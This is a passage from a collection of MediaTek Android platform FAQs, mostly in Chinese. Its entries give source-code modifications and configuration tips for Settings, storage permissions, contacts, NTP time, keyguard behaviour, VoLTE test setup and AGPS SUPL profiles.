allow bluetooth program_binary_service:service_manager find;

然後build load重燒。

这个是什么原因呢???
```

## [settings]  [FAQ17876]  设置——提示音和通知——铃声音量，播放时按HOME键或返回键，播放不停止

```text
packages/apps/Settings/src/com/mediatek/audioprofile/Editprofile.java
onPause 方法里面添加："mVolumeCallback.stopSample();"
```

## [launcher]  [FAQ17879]  Launcher主菜单的搜索框匹配规则是什么?

```text
搜索框的关键字会从主菜单应用名称中每个单词的开头开始匹配，无法从单词中间或者末尾匹配（空格隔开单词)。
譬如：在搜索框输入"T"，可以匹配"Dev Tools"、"Sim Toolkit"，无法匹配"Calculator"、"Contacts"。
```

## [FAQ17834]  M版本SettingsProvider的数据放在哪里?

```text
以前的版本都放在/data/data/com.android.providers.settings目录下的settings.db文件内，Android M版本存放在哪里呢? 
[SOLUTION] 
M版本上settings.db 只用做备份旧数据，新数据不会直接存到里面。
M版本现在的设置数据都是保存在
data/system/users/<userid>/settings_system.xml
data/system/users/<userid>/settings_global.xml
data/system/users/<userid>/settings_secure.xml
且settings.db里面的数据也会迁移到这些xml文件中。
```

## [FAQ17813]  CMW500 setup SOP for Volte test

```text
APN Settings
-->Settings ->More->Mobile networks settings->Data connection->Off
-->Settings -> More --> Mobile networks settings -> Access Point Names->New APN
Name = ims, APN = ims , APN type = ia, ims (Note: “default” APN MUST be unchecked),
APN protocol = IPv6

NVRAM Settings
--> Use MTK META tool to change below NVRAM value.
META tool -> NVRAM_EF_IMS_PROFILE_LID -> 1 -> imc_config -> voice_bearer_ctrl=0x00

Engineering Mode Settings
EM -> IMS -> Common -> operator_code -> choose VoLTE_Operator_CMW500
EM -> IMS -> Bearer -> ims_signaling_qci=5
EM -> IMS -> Call -> UA_call_precondition=0 (disable precondition for volte call)

CMW500 Settings
Default EPS Bearer for IMS QCI=5
Dedicated EPS bearer for Voice QCI=1(manually Setup dedicated bearer about 10s after UE registers IMS successfully)

Note
--> Restart UE for each testing.
--> DO NOT use Flight Mode
--> DO NOT use AT Command for all Configuration and Setting
--> CMW500 version:
 ->Base：3.2.70
 ->DAU：3.2.52.7
 ->LTE：3.2.82
```

## [log]  [FAQ17811]  如何从modem log看出E FACH和HS RACH是支持的

```text
1   从rrcConnectionSetupComplete 的 hsdschReception-CellFach: true (0) 可以看出E FACH 是支持的
hsscchlessHsdschOperation: true (0) 
enhancedFdpch: true (0) 
hsdschReception-CellFach: true (0) 
hsdschReception-CellUraPch: true (0) 
uplinkPhysChCapability 
edch-PhysicalLayerCategory-extension: 7 
 
2   从 EDCH_HS_DSCH_FACH_ENABLED 或者在 RRC Connection Request 里面有找到 supportOfCommonEDCH 就代表HS RACH 是支持的

modem log用什么工具查看???如何分析???
```

## [性能]  [storage]  [FAQ17556]  Android M 版本MTP查看手机剩余空间比从手机上看到的小

```text
MTP模式连接手机，从PC上查看手机内部存储剩余容量：
PC:   我的电脑-> MTP存储 ->Internal Storage ->右键属性 ->查看 Used space 和 Free Space
手机: Setting -> Storage&USB -> 查看Used Space
从PC上看到的 Used Space 更大，几百兆不等，和手机的Internal Storage 大小有关。
[SOLUTION] 
这是Google 的 Design。会Reserve 一部分存储空间，为防止内部存储被拷贝满而影响手机正常使用。
/frameworks/base/core/java/android/os/storage/StorageManager.java
public long getStorageLowBytes(File path) {
    final long lowPercent = Settings.Global.getInt(mResolver, Settings.Global.SYS_STORAGE_THRESHOLD_PERCENTAGE, DEFAULT_THRESHOLD_PERCENTAGE);
    // 可以通过改变DEFAULT_THRESHOLD_PERCENTAGE 的大小来改变预留空间的大小，默认是10%。
    private static final int DEFAULT_THRESHOLD_PERCENTAGE = 10;

    // Google 的解释如下：
    /**
     * Number of megabytes of space to leave unallocated by MTP.
     * MTP will subtract this value from the free space it reports back
     * to the host via GetStorageInfo, and will not allow new files to
     * be added via MTP if there is less than this amount left free in the storage.
     * If MTP has dedicated storage this value should be zero, but if MTP is
     * sharing storage with the rest of the system, set this to a positive value
     * to ensure that MTP activity does not result in the storage being
     * too close to full.
     *
     * @return MTP reserve space
```

## [people]  [FAQ11983]  [Contacts Data]  联系人列表#组置于A~Z之前

```text
修改文件ContactLocaleUtils.java两处
Path: /packages/contactsprovider/src/com/android/providers/contacts/

1. 函数public ContactLocaleUtilsBase(Locale locale)结尾处
...
mAlphabeticIndexBucketCount = mAlphabeticIndex.getBucketCount();
//add for put # group to first START
//mNumberBucketIndex = mAlphabeticIndexBucketCount - 1;
mNumberBucketIndex = 0;
//add for put # group to first END

2. 函数public int getBucketIndex(String name)结尾处 
...
mAlphabeticIndexBucketCount = mAlphabeticIndex.getBucketCount();
//add for put # group to first START
//mNumberBucketIndex = mAlphabeticIndexBucketCount - 1;
mNumberBucketIndex = 0;
//add for put # group to first END
```

## [storage]  [FAQ12136]  KK版本开始手机中发现很多三方apk，如三方filemanager，无法在外置sd卡上做新建、删除文件等写操作

```text
KK版本开始手机中发现很多三方apk，如三方filemanager，无法在外置sd卡上做新建、删除文件等写操作，如新建文件会出现如下Permission denied的错误
System.out: mkdir failed: EACCES (Permission denied) path = /storage/sdcard1/Android/data/cn.cmvideo.isj

[SOLUTION] 

一、因为KK版本上Google规定应用需要拥有android.permission.WRITE_MEDIA_STORAGE权限才能写副卡，所以若三方没有按照要求申请到权限，而又要写副卡就会出现操作失败。
google原文说明： http://source.android.com/devices/tech/storage/

二、应用要拥有android.permission.WRITE_MEDIA_STORAGE的条件：
1、AndroidManifest.xml中有申请android.permission.WRITE_MEDIA_STORAGE
<uses-permission android:name = "android.permission.WRITE_MEDIA_STORAGE" />
如果没有申请，需拿源码添加，否则该应用是肯定无法写副卡的。

2、要让这个权限申请成功，必须要采用下面2种方法之一
因为android.permission.WRITE_MEDIA_STORAGE属于SystemOrSignature level的permission，必须采用下面两种方法之一才能申请成功。
1). 应用签系统签名
2). 将应用预置到/system/priv-app/下，即在对应的Android.mk中添加如下语句：

LOCAL_PRIVILEGED_MODULE := true

三、对比测试需注意事项：
1、该对比机并没有被root
2、所做的操作确实是写副卡
3、要写的文件并非是卡/Android/data/[packagename] 下。因为google规定Android/data/[packagename] 是对应package的私有目录，对应的package是有权读写的。
```

## [FAQ11144]  [Common] 如何获取手机SN

```text
一、KK版本之前
KK之前由"phone" service提供接口： String getSN()

二、KK版本
KK版本是已经搬到"phoneEx" service中了，名称是： String getSerialNumber()

KK版上使用范例:
mTelEx = ITelephonyEx.Stub.asInterface(ServiceManager.getService("phoneEx"));
String SN = mTelEx. getSerialNumber();
或者也可以直接使用SystemProperties.get("gsm.serial");来获得；

三、L版本/L版本以后
L版本/L版本以后，未提供API接口给上层来调用；

请直接获取"gsm.serial"系统属性的值： SystemProperties.get("gsm.serial");
```

## [storage]  [FAQ16945]  MTK平台可以支持多大容量T卡?

```text
目前MTK平台的可以High Capacity SD Memory Card，因此最大可以Support 32GB的T card.
Memory capacity:
Standard Capacity SD Memory Card: Up to and including 2 GB
High Capacity SD Memory Card: More than 2GB (This version of specification limits capacity up to and including 32GB)
```

## [FAQ14118]  移除掉Android L上的TaskPersist功能

```text
1. 【问题现象】
关机或者重启手机后，最近任务列表仍然存在
2. 【问题原因】
Android L之后，在里面增加了任务持久化(TaskPersist)功能，用来在系统运行过程中对任务进行保存，而在开机过程中进入ActivityManagerServvice的systemReady()方法后，就对其进行恢复。 

修改的原理：
1.AMS其实就是将最近任务列表mRecentTasks 从持久化对象mTaskPersister中恢复过来，所以这里只要控制它不再恢复，而是直接new一个新的对象给它。
修改实作如下：
 
1.将ActivityManagerService.java中的systemReady中对应的代码。

修改前：
public void systemReady(final Runnable goingCallback) {
    if (mRecentTasks == null) {
        mRecentTasks = mTaskPersister.restoreTasksLocked();
    }

修改后：
public void systemReady(final Runnable goingCallback) {
    if (mRecentTasks == null) {
        //mtk added ，new 一个新的ArrayList给mRecentTasks。restoreTasksLocked的返回结果不再给 mRecentTasks
        mRecentTasks = new ArrayList();
        mTaskPersister.restoreTasksLocked();
    }
```

## [clock]  [FAQ12126]  没有网络，NTP更新时间问题

```text
这是ntp更新时间正常设计。
ntp在第一次更新时间时会把这个值保存到mCachedNtpTime，当再次通过ntp更新时间时，如果距离上次更新时间小于24小时，ntp便不会从网络上更新时间
而是使用上次保存的mCachedNtpTime这个加上2次更新的时间间隔getCacheAge()；如果更新时间间隔大于24小时，系统会从网络更新时间。
如下为具体code
NtpTrustedTime.java（frameworks\base\core\java\android\util）
///从网络更新时间
public boolean forceRefresh() {
    if (mServer == null) {
        // missing server, so no trusted time available
        return false;
    }
    if (LOGD) Log.d(TAG, "forceRefresh() from cache miss");
    final SntpClient client = new SntpClient();
    if (client.requestTime(mServer, (int) mTimeout)) {
        mHasCache = true;
        mCachedNtpTime = client.getNtpTime();
        mCachedNtpElapsedRealtime = client.getNtpTimeReference();
        mCachedNtpCertainty = client.getRoundTripTime() / 2;
        return true;
    } else {
        return false;
    }
}
///获取上次ntp更新的时间间隔
@Override
public long getCacheAge() {
    if (mHasCache) {
        return SystemClock.elapsedRealtime() - mCachedNtpElapsedRealtime;
    } else {
        return Long.MAX_VALUE;
    }
}
///获取当前系统时间(上次保存值和时间间隔之和)
@Override
public long currentTimeMillis() {
    if (!mHasCache) {
        throw new IllegalStateException("Missing authoritative time source");
    }
    if (LOGD) Log.d(TAG, "currentTimeMillis() cache hit");
    // current time is age after the last ntp cache; callers who
    // want fresh values will hit makeAuthoritative() first.
    return mCachedNtpTime + getCacheAge();
}
```

## [clock]  [FAQ07606]  恢复出厂设置后日期没有恢复为出厂设置默认值

```text
恢复出厂设置后，时间不能恢复为：2013年1月1日
仍然显示为之前设置的时间，如：2013年5月30日

[SOLUTION] 
由於之前有遇到一些預設年份過於老舊, 會造成 SSL 連線的時候, 驗證 Certificate 的有效時間會錯誤.
所以对这块有做更改 (下面修改在Android KK,L,M上有效)
可以修改下列的檔案.
alps\frameworks\base\services\java\com\android\server\NetworkTimeUpdateService.java

[Function] 
systemReady()
方法一:
關閉這個功能.

Log.d(TAG, "Set the year to " + mDefaultYear);
SystemProperties.set(BOOT_SYS_PROPERTY, "false");
//SystemClock.setCurrentTimeMillis(today.toMillis(false)); ==> 請修改此行

方法二:
還原成 2013/01/01

Log.d(TAG, "First boot:" + tempString + " with date:" + today);
today.set(1, 0, mDefaultYear);   //請修改此行
Log.d(TAG, "Set the year to " + mDefaultYear);
SystemProperties.set(BOOT_SYS_PROPERTY, "false");
SystemClock.setCurrentTimeMillis(today.toMillis(false));
```

## [sysui]  [FAQ17472]  灭屏后亮屏没有看到锁屏

```text
google默认设计：
（1）timeout灭屏（手机休眠时间到）时，不会立即锁屏，默认会等待5s才会上锁，5s内亮屏是不会看到有锁屏的。
（2）按电源键灭屏时， 如果没有勾选“按电源键立即锁屏”菜单，默认也会等待5s才上锁，5s内亮屏不会看到锁屏。
（3）keyguard被三方app disable掉了，所以灭屏不会上锁，亮屏不会看到锁屏。可从如下log中mExternallyEnabled的值为false表示keyguard是被三方app disable掉了。
   如果不是以上三种原因引起，请联系MTK技术人员解决。
 
11-27 08:49:43.505  1196  3408 D KeyguardViewMediator: doKeyguard : 
externally disabled reason..mExternallyEnabled = false
 
对于第三种原因引起的灭屏后亮屏没有看到锁屏，建议贵司接受这种设计，三方app是使用了KeyguardManager.java中提供的disableKeyguard()方法将锁屏disable掉了，这个接口目前google已不建议使用了。
如果坚持想要修改成三方app disable后不生效，可以参考下面两种方法：
（1）将KeyguardManager.java中disableKeyguard()和reenablekeyguard()方法直接return.(由于这是google提供的接口，所以不建议使用)
（2）将KeyguardViewMediator.java中使用到mExternallyEnabled这个变量的地方都把它的值当true使用。
```

## [sysui]  [FAQ17561]  recents界面长按某个应用图标会进入应用信息界面的说明

```text
在L0和M版本上，在recent界面，长按某个应用的应用图标区域(如左图红框)，会进入其应用信息界面（如右图）。
在L1的某些版本上，长按则无反应。原因在于某些版本中TaskView.java中mHeaderView.mApplicationIcon.setOnLongClickListener(this);是被两个if条件包住的, setOnLongClickListener没有被执行。
第一个if条件中Constants.DebugFlags.App.EnableDevAppInfoOnLongPress定义在Constants.java中，默认值是true；
第二个if条件中mConfig.developerOptionsEnabled由Setting应用中"开发者选项"开关决定。如果"开发者选项"开启，则为true，响应该图标的长按操作，否则则不响应。

如果希望不论何种条件，长按recent界面的某个应用图标都能进入该应用信息界面，可以仿照Android M的实现，将上图红框中两个if条件都拿掉即可。
```

## [sysui]  [FAQ17503]  VoLTE注册成功后关闭数据连接，状态栏上数据图标依然显示

```text
VoLTE注册成功后关闭数据连接，如果手机此时开了一路IMS Pdn，则会将当前data connection state通知上层(如下log所示)，所以状态栏上数据图标依然显示。
11-11 14:09:43.333 819 836 D TelephonyRegistry: mConnectedApns[0] : [ims] 
11-11 14:09:43.333 819 836 D TelephonyRegistry: notifyDataConnectionForSubscriber: handle onDataConnectionStateChanged
11-11 14:09:43.333 819 836 D TelephonyRegistry: onDataConnectionStateChanged(0, 13)
11-11 14:09:43.335 968 968 D NetworkController.MobileSignalController(1): onDataConnectionStateChanged: state=0 type=13
11-11 14:09:43.335 968 968 D NetworkController.MobileSignalController(1): updateNetworkType: DataState= 0, getDataNetworkType= 13
这在OM版本上是google default设计。
 
[SOLUTION] 
如果希望此时状态栏上不显示数据连接图标。
1. NetworkControllerImpl.java MobileSignalController中新增：
String mApnType = "unknown";
public void onPreciseDataConnectionStateChanged(PreciseDataConnectionState state) {
    /// M: Support onPreciseDataConnectionStateChanged. @{
    if((mDataState==state.getDataConnectionState())&&(mDataNetType == state.getDataConnectionNetworkType())){
        mApnType = state.getDataConnectionApnType();
    }
    if (PluginFactory.getStatusBarPlugin(mContext).customizeBehaviorSet() == BehaviorSet.OP01_BS) {
        mSvLteController.onPreciseDataConnectionStateChanged(state);
        mCurrentState.mShowDataActivityIcon = mSvLteController.isShowDataActivityIcon();
        notifyListenersIfNecessary();
    }
}

2. MobileSignalController.notifyListeners()中 showDataIcon变量加上mApnType 的判断即可。
```

## [FAQ14865]  Android L上EmergencyButton不显示初步分析方法

```text
在mainlog中搜索EmergencyButton关键字，看其中的如下log．
下面log中，　变量show的值表示紧急拨号显示或不显示，　为true表示显示EmergencyButton，　false表示不显示EmergencyButton．
antiTheftLocked的值表示当前是否防盗锁，为true表示当前是防盗锁，　false表示当前不是防盗锁．
mEmergencyButtonExt.showEccInNonSecureUnlock()的值表示是否在非安全锁上显示，　为false表示不在非安全锁上显示．
eccShouldShow的值表示是否允许EmergencyButton显示．
enabled的值稍稍复杂一点，可对着代码看，　根据EmergencyButton.java中函数private void updateEmergencyCallButton()去了解．
它们之间的关系是这样：　 show = (enabled || antiTheftLocked || mEmergencyButtonExt.showEccInNonSecureUnlock()) && eccShouldShow;

紧急拨号不显示多数情况是eccShouldShow的值的影响．eccShouldShow的值是在函数private boolean eccButtonShouldShow()函数返回的，
对于默认版本，　eccShouldShow为true的条件是ServiceState为STATE_IN_SERVICE或者ServiceState.isEmergencyOnly()的值为true. 对于联通版本，　它还要求sim卡处于ready状态．
可按照如上方法先确定问题时间点，如不能解决问题，请联系MTK技术人员，　并将分析结果贴入note中，以上分析结果能让MTK更精准的将问题分配给对应owner处理．


05-28 17:30:58.912  1139  1139 I EmergencyButton: show = true --> enabled= true, antiTheftLocked=false, mEmergencyButtonExt.showEccInNonSecureUnlock() =false, eccShouldShow=true
```

## [people]  [FAQ10256]  【Contacts Data】 RCS/AAS/SNE/SNS分别代表什么含义?

```text
RCS 是为国外一些运营商（如OP03），提供的一种类似于QQ、飞信的服务。这个东西会作为plug-in嵌入到Contacts中，提供一些即使通信、语音视频的服务。
AAS 是USIM卡的附属号码，这个附属号码会支持自定义Label。这个Feature是作为plug-in嵌入到Contacts中的，提供UI、db上支持这个功能的code。OP03上有这个feature。
SNE 是USIM卡的“NickName”功能，支持给一个USIM联系人起别名。部分USIM卡支持这个功能，OP06上有这个plug-in。
SNS 是之前开发的对Facebook等社交网络的整合支持，但这个Feature后来被拿掉掉了，没有MP过。这部分代码只存在于Host中，没有对应的plugin apk。

AAS和SNE在SPEC上的解释如下：

4.4.2.7 EFAAS (Additional number Alpha String)

This file contains the alpha strings that are associated with the user defined naming tags for additional numbers referenced in EFANR.

4.4.2.10 EFSNE (Second Name Entry)

The phone book also contains the option of a second name entry. The amount of second name entries may be less than or equal to the amount of records in EFADN. Each record contains a second name entry. This record cannot be shared between several phonebook entries.
```

## [people]  [FAQ09775]  【Contacts Data】 短信选择收件人时，号码搜索联系人修改成任意位置开始中间匹配

```text
ContactsProvider2.java 中的queryLocal函数，修改方法如下：
case PHONES_FILTER:
case CALLABLES_FILTER: 
......
if (searchPhoneNumber) {
    ......
    sb.append(Data._ID +
            " IN (SELECT DISTINCT " + PhoneLookupColumns.DATA_ID
            + " FROM " + Tables.PHONE_LOOKUP
            + " WHERE " + PhoneLookupColumns.NORMALIZED_NUMBER + " LIKE '");
    //add here 
    sb.append("%");
    sb.append(number);
    sb.append("%')");
    hasCondition = true;
}
```

## [people]  [FAQ08959]  【Contacts Data】 Contacts/Acore进程经常被Kill，导致联系人开机后丢失怎么办?

```text
Contacts/Acore进程，在内存较少和开机进程过多的情况下会经常被 ActivityManager Kill 掉，
导致Sim卡联系人开机后未导入或者只导入一部分，造成联系人丢失的现象，但是重新开机后可以恢复正常。
[SOLUTION] 
遇到这样的问题可以采用以下方法提供Contacts/Acore进程的优先级，降低被ActivityManager 杀掉的概率。
 
找到这个进程对应的AndroidMannifest.xml文件，在其中添加属性『android:persistent="true"』，
这样可以将该进程设置为常驻内存进程，就可以降低被Kill的概率。
以Acore进程为例，
在 /package/providers/ContactsProvider/AndroidMannifest.xml 文件中增加一行『android:persistent="true"』
具体修改示例如下：
<application android:process="android.process.acore"
     android:label="@string/app_label"
     android:icon="@drawable/app_icon"
     android:allowBackup="false"
     android:persistent="true" <!--新增加代码，保证acore进程不被ActivityManager杀死-->
>
NOTICE:
这个方法可以将对应AP的ADJ临时提高到2。

解决发生JE问题（必须合入）：
CallLogProvider.java  (Line1000)

public static final void notifyNewCallsCount(SQLiteDatabase db, Context context) {
    Log.i(TAG, "[notifyNewCallsCount]  newCallsCount = " + newCallsCount);
    //send count=0 to clear the unread icon
    if (newCallsCount >= 0) {
        Intent newIntent = new Intent(Intent.MTK_ACTION_UNREAD_CHANGED);
        newIntent.putExtra(Intent.MTK_EXTRA_UNREAD_NUMBER, newCallsCount);
        newIntent.putExtra(Intent.MTK_EXTRA_UNREAD_COMPONENT, new ComponentName(Constants.CONTACTS_PACKAGE, Constants.CONTACTS_DIALTACTS_ACTIVITY));
        // New add for fixed JE
        newIntent.addFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY_BEFORE_BOOT);
        // End
        context.sendBroadcast(newIntent);
```

## [people]  [FAQ10264]  【Contacts Data】sim卡姓名长度最大为14字节可以输入11个相同汉字

```text
SIM卡记录名字的最大长度是14 ，可以输入14个字符，输入中文是可以输入6个，但是如果是相同的汉字 ，可以输入11个。如，可以保存"天天天天天天天天天天天" ,但只能保存"天天天天天气”
[SOLUTION] 
sim联系人的中文编码采用UCS2 0x81编码. 编码格式为，14个字节，前两个字节表示编码方式和长度.一个汉字占用两个字节.
当输入全部相同的汉字时，将采用基址偏移的方式，第三个字节为基址, 后面11个字节则是通过基址偏移对应的unicode编码. 所以，当输入相同的汉字，最多可以存储11个汉字.
 
例如,  杜杜杜
UNICODE编码为:675C675C675C
用UCS2的81方案表示是:81 03 CE DCDCDC
81：为标记
03：表示整个字符串为3个字符
CE：一个字节为基址。解析的方法为：将基址（CE）左移七位，并将最高位置为0，最低位再补一个0.此时基址变为0x6700，然后再判断后面的数据字节。
DCDCDC：3个数据字节 DC， DC， DC 。如果数据字节的最高位为0，则认为此字节是一个ASCII字符。如果数据字节的最高位为1，则低7位为基址的一个偏移，实际的UCS2字符为基址加上这个偏移值。由于此处三个数据字节最高位都为1，则实际的3个字符的偏移值为：5C， 5C， 5C。实际的UCS2编码为： 0x675C 0x675C 0x675C
```

## [people]  [FAQ10397]  【Contacts Data】 SDN/FDN/BDN MTK平台是否支持?

```text
SIM卡的SDN/FDN/BDN MTK SmartPhone平台是否支持?
[SOLUTION] 
EF_SDN (Service Dialling Numbers)  [业务拨号号码] 
--> 默认支持
     联系人列表最上面会显示所有SDN
EF_FDN (Fixed Dialling Numbers)  [固定拨号号码] 
--> 默认支持
     Dialpad -> Settings -> Other Settings -> Fixed Dialing Number -> Enable FDN -> FDN List
EF_BDN (Barred Dialling Numbers)  [禁止拨号号码]  
--> 目前不支持
 
NOTE:
您可以通过在拨号盘输入 *#*#4636#*#* 来进入Phone information
  --> Menu
  --> View SIM address book           [ADN] 
  --> View Fixed Dialing Numbers      [FDN] 
  --> View Service Dialing Numbers   [SDN] 

SDN/FDN/BDN 有什么用??
```

## [people] 如何导出国内手机号码归属地的数据库?

```text
adb pull /system/etc/geocoding.db ./
```

## [people]  [FAQ13184]  【Contacts Data】 如何修改最小匹配位数MIN_MATCH?

```text
如何修改最小匹配位数MIN_MATCH? 
[SOLUTION] 
调整MIN_MATCH涉及三支文件：
1. PhoneNumberUtils.java   MIN_MATCH
    （alps\frameworks\base\telephony\java\android\Telephony\）
2. OldPhoneNumberUtils.cpp   getMinMatch()
    （alps\external\sqlite\Android\）
3. PhoneNumberExt.java getMinMatch() （After KK 4.4）
    L:（alps\vendor\mediatek\proprietary\frameworks\base\packages\fwkplugin\src\com\mediatek\op\Telephony\） 
    KK:（alps\mediatek\frameworks\common\src\com\mediatek\common\Telephony\）
```

## [FAQ17576]  [Storage] 如何在android M版本的storage有关界面里不显示sdcard品牌名称?

```text
android M版本当插入sdcard的后，在storage有关界面里面会显示sdcard厂商。下图示例是一张sandisk的sdcard插入到M版本的手机中作为Portable storage在setting->Storage&USB显示情况：
详细修改方案：
/system/vold/Disk.cpp
需要对status_t Disk::readMetadata() 函数中如下语句进行修改，将蓝色code修改为红色code
 
notifyEvent(ResponseCode::DiskLabelChanged, mLabel);
修改为：
notifyEvent(ResponseCode::DiskLabelChanged, “”);
```

## [FAQ17577]  omacp的browser xml文件样本

```text
<wap-provisioningdoc>
    <characteristic type="BOOTSTRAP">
        <parm name="NAME" value="settings" /> 
    </characteristic>
    <characteristic type="APPLICATION">
        <parm name="APPID" value="w2"/>
        <parm name="NAME" value="bookmark folder name"/>
        <parm name="TO-PROXY" value="PROXY"/>
        <parm name="TO-NAPID" value="INTERNET"/>
        <characteristic type="RESOURCE">
            <parm name="AAUTHNAME" value="username"/>
            <parm name="AAUTHTYPE" value="HTTP-BASIC"/>
            <parm name="AAUTHSECRET" value="password"/>
            <parm name="URI" value="www.qq.com/index.wml"/>
            <parm name="NAME" value="QQ"/>
            <parm name="STARTPAGE"/>
        </characteristic>
    </characteristic>
</wap-provisioningdoc>
```

## [FAQ13612]  Mms Apn的omacp xml文件样本

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE wap-provisioningdoc PUBLIC "-//WAPFORUM//DTD PROV 1.0//EN" "http://www.wapforum.org/DTD/prov.dtd">
<wap-provisioningdoc version="1.1">
  <characteristic type="BOOTSTRAP">
       <parm name="NAME" value="WAP y MMS"/>
       <!parm name="PROVURL" value="http://www.mediatek.com/"/>
       <parm name="CONTEXT-ALLOW" value="0"/>
       <parm name="PROXY-ID" value=""/>
  </characteristic>
  <characteristic type="PXLOGICAL">
       <parm name="PROXY-ID" value="id4"/>
       <parm name="NAME" value="MMS"/>
         <characteristic type="PXPHYSICAL">
              <parm name="PHYSICAL-PROXY-ID" value="id4"/>
              <parm name="PXADDR" value="10.0.0.172"/>
              <parm name="PXADDRTYPE" value="IPV4"/>
              <parm name="TO-NAPID" value="ap4"/>
                <characteristic type="PORT">
                     <parm name="PORTNBR" value="80"/>
                </characteristic>
         </characteristic>
  </characteristic>
  <characteristic type="NAPDEF">
       <parm name="NAPID" value="ap4"/>
       <parm name="BEARER" value="GSM-GPRS"/>
       <parm name="NAME" value="mediatek彩信 (China Mobile)"/>
       <parm name="NAP-ADDRESS" value="mediatekcmwap"/>
       <parm name="NAP-ADDRTYPE" value="APN"/>
  </characteristic>
  <characteristic type="APPLICATION">
       <parm name="APPID" value="w4"/>
       <parm name="NAME" value="mms"/>
       <parm name="ADDR" value="http://mmsc.monternet.com"/>
       <parm name="TO-PROXY" value="id4"/>
         <parm name="CM" value="R"/>
  </characteristic>
</wap-provisioningdoc>
```

## [FAQ12286]  [Dialer]  [KK] 进入Dialer显示最新一条的通话记录不变，不随calllog的切换tab操作改变

```text
通过下面的修改确保Dialer界面的最新通话记录不会随着Calllog切换tab页面的操作而改变.
请修改PhoneFavoriteFragment.java, fetchCalls, 注释下面两行代码. 其余不变.

//int typeFilter = prefs.getInt(Constants.TYPE_FILTER_PREF, Constants.FILTER_TYPE_DEFAULT);
int typeFilter = Constants.FILTER_TYPE_ALL;
```

## [clock]  [FAQ17512]  开机通过SIM卡更新时间出错

```text
开机的时候通过SIM卡更新时间出问题
从LOG中看到 MccTable: timezone set to ××时区
如果××时区和SIM卡的MCC号对应不上就会出现此问题。 

frameworks\opt\telephony\src\java\com\android\internal\telephony\gsm GsmServiceStateTracker.java
private String[]  []  mTimeZoneIdByMcc = {{"460", "Asia/Shanghai"}这个数组中添加上自己需要的时区和SIM卡MCC号码
```

## [FAQ08125]  [Audio App] 观看优酷视频或者youtube时如何将music,FM等后台播放停掉

```text
优酷视频或者youtube使用HTML5Video进行播放
修改方法如下：
修改HTML5VideoView.java中方法start()
在   mPlayer.start();  之前添加
Intent i = new Intent("com.android.music.musicservicecommand");
i.putExtra("command", "pause"); 
mProxy.getContext().sendBroadcast(i);

在开始播放时broadcast此消息，FM，music app中会接收此消息并停止
```

## [FAQ08112]  [Audio Speech]  不同制式下语音加密算法及密钥长度

```text
有客户在过运营测试时运营商要求提供不同制式下语音加密算法及密钥长度
目前支持情况如下：
加密算法             密钥长度              制式
A5_1/A5_3         64 bits               GSM
UEA-0/UEA-1     128 bits;             UMTS
```

## [FAQ12562]  [Audio App] 如何关闭com.mediatek.voicecommand进程

```text
请在 ProjectConfig.mk 中进行配置：
MTK_VOICE_CONTACT_SEARCH_SUPPORT=no
MTK_VOICE_UI_SUPPORT=no
MTK_VOICE_UNLOCK_SUPPORT=no
```

## [FAQ10792]  [Audio App] 如何在手机中不显示某类后缀名的多媒体文件

```text
请在frameworks\base\media\java\android\media\mediafile.java中，找到不显示的某类后缀名
addFileType(后缀名,...) //直接拿掉
```

## [FAQ17430]  如何让某个APK里面的图片能够作为壁纸使用

```text
1.在APK中需要申明Action为“com.android.launcher3.action.PARTNER_CUSTOMIZATION”的receiver
<receiver
    android:name="com.example.partner_wallpaper.WallpaperReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.android.launcher3.action.PARTNER_CUSTOMIZATION" />
    </intent-filter>
</receiver>
2.编写Receiver的类，重写onRecive方法
public class WallpaperReceiver extends BroadcastReceiver{
    @Override
    public void onReceive(Context arg0, Intent arg1) {
    }
}
3.将想要作为壁纸的图片放到apk代码的res/drawable-xxx目录下，并将其重名为 xxx, 还要提供对应的缩略图（小图）放在相同的目录下并命名为xxx_small.

xxx_small显示在壁纸选择列表，xxx是作为壁纸使用。

4.在APK代码的res/value/arrays.xml中增加partner_wallpapers字符串数组资源
<?xml version="1.0" encoding="utf-8"?> 
<resources>
    <!-- name 必须固定为partner_wallpapers-->
    <string-array name="partner_wallpapers">
        <!-- item 与第3步中图片名对应-->
        <item>a</item>
        <item>b</item>
        <item>c</item>
    </string-array>
</resources>

此时如果将此APK预置为系统APK，则这些图片就能出现在Launcher的WallPapaer Picker中，可以作为壁纸使用。
如果不想把APK预置为系统的APK，让其安装上去就能实现此功能，则需要按以下方法修改Launcher的代码。

5.修改 Launcher的Utilities.java文件中的findSystemApk方法
```

## [gps]  [FAQ17443]  [SLP Template]  AGPS Supl Profile Configration

```text
1.How to change default supl profile
In agps_profiles_conf2.xml,the default profile is google, whose format is：
<cur_supl_profile name="GOOGLE"
    addr="supl.google.com"
    port="7275"
    tls="true"
/>
cur_supl_profile is refer to default profile. If we need change the default profile, we should change it as below:
<cur_supl_profile name="nexteldata"
    addr="supl.iusacell.com"
    port="7275"
    tls="true"
/>
Now the default profile will be changed to nexteldata, which can be seen in SLP Template.
 
2.How to add supl profile
If we want to add supl profile in agps_profiles_conf2.xml, we only need to add supl_profile, according to google’s format as below:
<!-- GOOGLE-->
<supl_profile name="GOOGLE"
    addr="supl.google.com"
    port="7275"
    tls="true"
/>
<!-- nexteldata-->
<supl_profile name="nexteldata"
    addr=" supl.iusacell.com "
    port="7275"
    tls="true"
/>
<!-- IUSACELL-->
<supl_profile name="IUSACELL"
    addr="supl.iusacell.com"
    port="7275"
    tls="true"
/>
Now the nexteldata and IUSACELL are added to the SLP Template.

3.How to adaptive change supl profile
If we want to adaptive change supl profile along with SIM card, we should ensure auto_profile_enable=“true” in agps_profiles_conf2.xml , then add operator MCC and MNC in profile as below:
<!-- GOOGLE-->
<supl_profile name="GOOGLE"
    addr="supl.google.com"
    port="7275"
    tls="true"
/>
<!-- nexteldata--> 
<supl_profile name="nexteldata"
    addr="supl.iusacell.com"
    port="7275"
    tls="true“
    mcc_mnc="334050"
/>
<!-- IUSACELL-->
<supl_profile name="IUSACELL"
    addr="supl.iusacell.com"
    port="7275"
    tls="true“
    mcc_mnc="334090"
/>
Now if the inserted SIM card is mcc(334) mnc(050), the SLP Template will auto select nexteldata, else if the inserted SIM card is mcc(334) mnc(090), the SLP Template will auto select IUSACELL.
```

## [FAQ15090]  [FM] open /dev/fm fail

```text
L版本使用fm app时遇到open /dev/fm fail问题，从log来看/dev/fm这个设备节点打开失败，失败原因是节点的访问权限问题，如下红色字体内容： 
Line 14637: 01-02 09:06:19.878  3563  3592 I FMLIB_COM: COM_open_dev start
